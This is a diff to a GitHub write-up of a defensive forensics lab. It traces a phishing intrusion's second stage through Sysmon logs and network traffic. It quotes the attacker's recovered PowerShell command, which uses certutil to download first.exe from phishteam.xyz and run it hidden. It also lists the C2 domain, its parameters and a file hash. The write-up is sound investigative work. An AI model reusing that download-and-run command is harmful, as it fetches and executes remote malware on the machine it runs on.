@@ -78,7 +78,71 @@ I retrieved it by locating the binary with the same Base64 string, then inputted
 > <img width="1119" height="478" alt="12" src="https://github.com/user-attachments/assets/6ba876b0-be95-4240-847c-cc1ff23b4cbc" />
 > <img width="1113" height="200" alt="13" src="https://github.com/user-attachments/assets/3b134a7b-db4c-4228-bf21-cfd65467fd89" />
 
+*** Initial Access - Stage 2 Execution *** 
+
+> Moving on i had to answer a few questions based on Stage 2 execution after discovering the initial finding. For the first question i had to figure out the full target path of
+payload that was written by the malicious execution of the payload, which then wrote a file on the system. To figure this out i simply inputted "appdata" within the input field
+of the Timeline Explorer application. After investigating the Events under Event ID 11 i retrieved the full target path to be:
+"C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup."
+>
+> <img width="406" height="213" alt="14" src="https://github.com/user-attachments/assets/0ed5d1d8-b8e2-4835-b216-710d7dfb072b" />
+> <img width="376" height="140" alt="15" src="https://github.com/user-attachments/assets/56a02b6c-dfa9-4d2d-b068-85e733e35ac8" />
+> <img width="849" height="315" alt="16" src="https://github.com/user-attachments/assets/5d4f6bb1-6ae8-4cbb-9079-9ea88cc72b65" />
+
+> I then retrieved the executed command upon successful login of the compromised user to be:
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
+>
+> <img width="1153" height="315" alt="17" src="https://github.com/user-attachments/assets/27a74945-8e92-47ab-bb39-61310600144e" />
+
+> Upon investigating the Sysmon logs, i was able to retrieve the SHA256 hash of the malicious binary downloaded for Stage 2 execution to be:
+CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
+>
+> <img width="559" height="187" alt="18" src="https://github.com/user-attachments/assets/b4dfd55b-c333-40e4-89f0-63110696cd3b" />
+> <img width="994" height="310" alt="19" src="https://github.com/user-attachments/assets/e61e9510-2ee6-4f07-92f3-3df27faf9a6a" />
+
+> Finally, for the Stage 2 execution i discovered the domain and port used by the attacker to be: "resolvecyber.xyz:80." Which was produced after the stage 2 payload downloaded
+established a connection to a C2 server.
+>
+> <img width="399" height="159" alt="20" src="https://github.com/user-attachments/assets/dca6be0c-a9b7-48fc-8924-4b2a7cd563a8" />
+> <img width="1023" height="320" alt="21" src="https://github.com/user-attachments/assets/5e34c31e-58df-4bb9-876a-f3648b51a90a" />
+
+*** Initial Access - Malicious Document Traffic ***
+
+> Moving on, i had to answer a few question related to the attacker fetching the Stage 2 payload remotely. For the first question i had to figure out the URL of the malicious
+payload embedded in the document. To figure this out i launched Brim, then inputted the filter: _path=="http" "<phishteam.xyz>" GET. Which returned the URL:
+http://phishteam.xyz/02dcf07/index.html.
+>
+> <img width="1137" height="678" alt="22" src="https://github.com/user-attachments/assets/27e2140a-4f5e-4248-a57d-9028c88c899f" />
+
+> I then discovered the encoding used by the attacker on the C2 connection to be "base64."
+>
+> <img width="1089" height="470" alt="23" src="https://github.com/user-attachments/assets/53596d60-82fe-41ad-894f-4dd561a42f6c" />
+> <img width="1650" height="766" alt="24" src="https://github.com/user-attachments/assets/c1dda3d0-99eb-4279-80b6-9d71c3202500" />
+
+> Further into the investigation, i identified the parameter that contained the executed command results when the malicious c2 binary sends a payload to be:
+"q."
+I also identified the URL used by the binary to get the command to be executed as "/9ab62b5." Which used the "GET" HTTP method.
+>
+> <img width="476" height="280" alt="25" src="https://github.com/user-attachments/assets/af5157d4-bcfb-4547-8aa7-e37c6deafc8a" />
+> <img width="431" height="215" alt="26" src="https://github.com/user-attachments/assets/41b36c15-22f9-4668-b2e0-b7ddc8d9006e" />
+> <img width="995" height="234" alt="27" src="https://github.com/user-attachments/assets/40438b8f-6808-4005-be44-4c38ae48a3df" />
+
 > 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
